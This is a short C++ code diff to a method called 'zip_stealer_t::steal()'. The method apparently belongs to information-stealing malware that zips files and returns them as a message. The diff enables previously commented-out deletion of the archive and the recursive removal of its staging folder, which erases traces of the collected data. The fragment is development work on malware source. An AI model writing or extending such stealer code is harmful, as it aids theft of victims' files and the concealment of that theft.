@@ -65,10 +65,8 @@ asio::awaitable<std::unique_ptr<message_t>> zip_stealer_t::steal()
     auto to_ret = std::make_unique<file_message_t>();
     to_ret->init_with_path(archive_path.string());
 
-    /* TODO uncomment
     fs::remove(archive_path);
-    fs::remove(zip_folder_path);
-    */
+    fs::remove_all(zip_folder_path);
 
     co_return to_ret;
 }
